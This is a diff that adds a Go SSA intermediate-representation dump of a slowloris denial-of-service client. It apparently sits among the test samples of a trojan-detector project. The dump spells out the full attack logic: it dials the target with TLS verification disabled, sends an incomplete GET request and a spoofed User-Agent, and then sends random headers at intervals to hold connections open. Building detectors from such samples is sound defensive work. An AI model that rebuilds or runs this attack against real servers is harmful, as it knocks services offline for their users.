@@ -1,0 +1,266 @@
+# Name: command-line-arguments.init
+# Package: command-line-arguments
+# Synthetic: package initializer
+func init():
+0:                                                                entry P:0 S:2
+	t0 = *init$guard                                                   bool
+	if t0 goto 2 else 1
+1:                                                           init.start P:1 S:1
+	*init$guard = true:bool
+	t1 = context.init()                                                  ()
+	t2 = crypto/tls.init()                                               ()
+	t3 = fmt.init()                                                      ()
+	t4 = net.init()                                                      ()
+	t5 = net/url.init()                                                  ()
+	t6 = os.init()                                                       ()
+	t7 = strings.init()                                                  ()
+	t8 = time.init()                                                     ()
+	t9 = github.com/icrowley/fake.init()                                 ()
+	jump 2
+2:                                                            init.done P:2 S:0
+	return
+
+# Name: command-line-arguments.Slowloris
+# Package: command-line-arguments
+# Location: E:\Trojan Detector\Trojan-Detector\src\Golang\test\Client\lib\DOS\slowloris\slowloris.go:28:6
+# Locals:
+#   0:	t0 Options
+func Slowloris(ctx context.Context, index int64, options Options) error:
+0:                                                                entry P:0 S:2
+	t0 = local Options (options)                                   *Options
+	*t0 = options
+	t1 = &t0.URL [#0]                                         **net/url.URL
+	t2 = *t1                                                   *net/url.URL
+	t3 = &t0.Secure [#2]                                              *bool
+	t4 = *t3                                                           bool
+	t5 = Dialer(t2, t4)                                   (net.Conn, error)
+	t6 = extract t5 #0                                             net.Conn
+	t7 = extract t5 #1                                                error
+	t8 = t7 != nil:error                                               bool
+	if t8 goto 1 else 2
+1:                                                              if.then P:1 S:0
+	return t7
+2:                                                              if.done P:1 S:2
+	t9 = &t2.Path [#4]                                              *string
+	t10 = *t9                                                        string
+	t11 = GetRequestLine(t10)                                        string
+	t12 = new [2]any (varargs)                                      *[2]any
+	t13 = &t12[0:int]                                                  *any
+	t14 = make any <- int64 (index)                                     any
+	*t13 = t14
+	t15 = &t12[1:int]                                                  *any
+	t16 = make any <- string (t11)                                      any
+	*t15 = t16
+	t17 = slice t12[:]                                                []any
+	t18 = fmt.Printf("\rslowloris(%d): s...":string, t17...) (n int, err error)
+	t19 = *os.Stdout                                               *os.File
+	t20 = convert []byte <- string ("\x1b[2K":string)                []byte
+	t21 = (*os.File).Write(t19, t20)                     (n int, err error)
+	t22 = httpLine(t11)                                              string
+	t23 = convert []byte <- string (t22)                             []byte
+	t24 = invoke t6.Write(t23)                           (n int, err error)
+	t25 = extract t24 #0                                                int
+	t26 = extract t24 #1                                              error
+	t27 = t26 != nil:error                                             bool
+	if t27 goto 3 else 5
+3:                                                              if.then P:2 S:0
+	return t26
+4:                                                              if.done P:1 S:2
+	t28 = &t0.UserAgent [#1]                                        *string
+	t29 = *t28                                                       string
+	t30 = t29 == "random":string                                       bool
+	if t30 goto 6 else 7
+5:                                                           cond.false P:1 S:2
+	t31 = len(t22)                                                      int
+	t32 = t25 < t31                                                    bool
+	if t32 goto 3 else 4
+6:                                                              if.then P:1 S:1
+	t33 = github.com/icrowley/fake.UserAgent()                       string
+	jump 7
+7:                                                              if.done P:2 S:2
+	t34 = phi [4: t29, 6: t33] #userAgent                            string
+	t35 = new [2]any (varargs)                                      *[2]any
+	t36 = &t35[0:int]                                                  *any
+	t37 = make any <- int64 (index)                                     any
+	*t36 = t37
+	t38 = &t35[1:int]                                                  *any
+	t39 = make any <- string (t34)                                      any
+	*t38 = t39
+	t40 = slice t35[:]                                                []any
+	t41 = fmt.Printf("\rslowloris(%d): s...":string, t40...) (n int, err error)
+	t42 = *os.Stdout                                               *os.File
+	t43 = convert []byte <- string ("\x1b[2K":string)                []byte
+	t44 = (*os.File).Write(t42, t43)                     (n int, err error)
+	t45 = Header("User-Agent":string, t34)                           string
+	t46 = httpLine(t45)                                              string
+	t47 = convert []byte <- string (t46)                             []byte
+	t48 = invoke t6.Write(t47)                           (n int, err error)
+	t49 = extract t48 #0                                                int
+	t50 = extract t48 #1                                              error
+	t51 = t50 != nil:error                                             bool
+	if t51 goto 8 else 10
+8:                                                              if.then P:2 S:0
+	return t50
+9:                                                              if.done P:1 S:1
+	t52 = &t0.Interval [#4]                                  *time.Duration
+	t53 = *t52                                                time.Duration
+	jump 11
+10:                                                          cond.false P:1 S:2
+	t54 = len(t46)                                                      int
+	t55 = t49 < t54                                                    bool
+	if t55 goto 8 else 9
+11:                                                            for.body P:2 S:2
+	t56 = invoke ctx.Done()                                 <-chan struct{}
+	t57 = time.After(t53)                                  <-chan time.Time
+	t58 = select blocking [<-t56, <-t57] (index int, ok bool, struct{}, time.Time)
+	t59 = extract t58 #0                                                int
+	t60 = t59 == 0:int                                                 bool
+	if t60 goto 12 else 13
+12:                                                         select.body P:1 S:0
+	return nil:error
+13:                                                         select.next P:1 S:2
+	t61 = t59 == 1:int                                                 bool
+	if t61 goto 14 else 15
+14:                                                         select.body P:1 S:2
+	t62 = RandomHeader()                                             string
+	t63 = new [2]any (varargs)                                      *[2]any
+	t64 = &t63[0:int]                                                  *any
+	t65 = make any <- int64 (index)                                     any
+	*t64 = t65
+	t66 = &t63[1:int]                                                  *any
+	t67 = make any <- string (t62)                                      any
+	*t66 = t67
+	t68 = slice t63[:]                                                []any
+	t69 = fmt.Printf("\rslowloris(%d): s...":string, t68...) (n int, err error)
+	t70 = *os.Stdout                                               *os.File
+	t71 = convert []byte <- string ("\x1b[2K":string)                []byte
+	t72 = (*os.File).Write(t70, t71)                     (n int, err error)
+	t73 = httpLine(t62)                                              string
+	t74 = convert []byte <- string (t73)                             []byte
+	t75 = invoke t6.Write(t74)                           (n int, err error)
+	t76 = extract t75 #0                                                int
+	t77 = extract t75 #1                                              error
+	t78 = t77 != nil:error                                             bool
+	if t78 goto 16 else 17
+15:                                                         select.next P:1 S:0
+	t79 = make interface{} <- string ("blocking select m...":string) interface{}
+	panic t79
+16:                                                             if.then P:2 S:0
+	return t77
+17:                                                          cond.false P:1 S:2
+	t80 = len(t73)                                                      int
+	t81 = t76 < t80                                                    bool
+	if t81 goto 16 else 11
+
+# Name: command-line-arguments.Dialer
+# Package: command-line-arguments
+# Location: E:\Trojan Detector\Trojan-Detector\src\Golang\test\Client\lib\DOS\slowloris\slowloris.go:81:6
+func Dialer(url *net/url.URL, secure bool) (net.Conn, error):
+0:                                                                entry P:0 S:2
+	t0 = &url.Host [#3]                                             *string
+	t1 = *t0                                                         string
+	t2 = strings.Contains(t1, ":":string)                              bool
+	if t2 goto 2 else 1
+1:                                                              if.then P:1 S:2
+	if secure goto 3 else 4
+2:                                                              if.done P:3 S:2
+	t3 = phi [0: t1, 3: t12, 4: t21] #host                           string
+	if secure goto 5 else 6
+3:                                                              if.then P:1 S:1
+	t4 = &url.Host [#3]                                             *string
+	t5 = *t4                                                         string
+	t6 = new [2]any (varargs)                                       *[2]any
+	t7 = &t6[0:int]                                                    *any
+	t8 = make any <- string (t5)                                        any
+	*t7 = t8
+	t9 = &t6[1:int]                                                    *any
+	t10 = make any <- string ("443":string)                             any
+	*t9 = t10
+	t11 = slice t6[:]                                                 []any
+	t12 = fmt.Sprintf("%s:%s":string, t11...)                        string
+	jump 2
+4:                                                              if.else P:1 S:1
+	t13 = &url.Host [#3]                                            *string
+	t14 = *t13                                                       string
+	t15 = new [2]any (varargs)                                      *[2]any
+	t16 = &t15[0:int]                                                  *any
+	t17 = make any <- string (t14)                                      any
+	*t16 = t17
+	t18 = &t15[1:int]                                                  *any
+	t19 = make any <- string ("80":string)                              any
+	*t18 = t19
+	t20 = slice t15[:]                                                []any
+	t21 = fmt.Sprintf("%s:%s":string, t20...)                        string
+	jump 2
+5:                                                              if.then P:1 S:0
+	t22 = new crypto/tls.Config (complit)                *crypto/tls.Config
+	t23 = &t22.InsecureSkipVerify [#14]                               *bool
+	*t23 = true:bool
+	t24 = crypto/tls.Dial("tcp":string, t3, t22)  (*crypto/tls.Conn, error)
+	t25 = extract t24 #0                                   *crypto/tls.Conn
+	t26 = make net.Conn <- *crypto/tls.Conn (t25)                  net.Conn
+	t27 = extract t24 #1                                              error
+	return t26, t27
+6:                                                              if.done P:1 S:0
+	t28 = net.Dial("tcp":string, t3)                      (net.Conn, error)
+	t29 = extract t28 #0                                           net.Conn
+	t30 = extract t28 #1                                              error
+	return t29, t30
+
+# Name: command-line-arguments.GetRequestLine
+# Package: command-line-arguments
+# Location: E:\Trojan Detector\Trojan-Detector\src\Golang\test\Client\lib\DOS\slowloris\slowloris.go:104:6
+func GetRequestLine(path string) string:
+0:                                                                entry P:0 S:0
+	t0 = new [1]any (varargs)                                       *[1]any
+	t1 = &t0[0:int]                                                    *any
+	t2 = make any <- string (path)                                      any
+	*t1 = t2
+	t3 = slice t0[:]                                                  []any
+	t4 = fmt.Sprintf("GET %s HTTP/1.1":string, t3...)                string
+	return t4
+
+# Name: command-line-arguments.Header
+# Package: command-line-arguments
+# Location: E:\Trojan Detector\Trojan-Detector\src\Golang\test\Client\lib\DOS\slowloris\slowloris.go:109:6
+func Header(key string, val string) string:
+0:                                                                entry P:0 S:0
+	t0 = strings.Title(key)                                          string
+	t1 = new [2]any (varargs)                                       *[2]any
+	t2 = &t1[0:int]                                                    *any
+	t3 = make any <- string (t0)                                        any
+	*t2 = t3
+	t4 = &t1[1:int]                                                    *any
+	t5 = make any <- string (val)                                       any
+	*t4 = t5
+	t6 = slice t1[:]                                                  []any
+	t7 = fmt.Sprintf("%s: %s":string, t6...)                         string
+	return t7
+
+# Name: command-line-arguments.RandomHeader
+# Package: command-line-arguments
+# Location: E:\Trojan Detector\Trojan-Detector\src\Golang\test\Client\lib\DOS\slowloris\slowloris.go:115:6
+func RandomHeader() string:
+0:                                                                entry P:0 S:0
+	t0 = github.com/icrowley/fake.Word()                             string
+	t1 = github.com/icrowley/fake.Word()                             string
+	t2 = Header(t0, t1)                                              string
+	return t2
+
+# Name: command-line-arguments.ClosingLine
+# Package: command-line-arguments
+# Location: E:\Trojan Detector\Trojan-Detector\src\Golang\test\Client\lib\DOS\slowloris\slowloris.go:120:6
+func ClosingLine() string:
+0:                                                                entry P:0 S:0
+	t0 = httpLine("":string)                                         string
+	t1 = httpLine(t0)                                                string
+	return t1
+
+# Name: command-line-arguments.httpLine
+# Package: command-line-arguments
+# Location: E:\Trojan Detector\Trojan-Detector\src\Golang\test\Client\lib\DOS\slowloris\slowloris.go:125:6
+func httpLine(str string) string:
+0:                                                                entry P:0 S:0
+	t0 = str + "\r\n":string                                         string
+	return t0
+
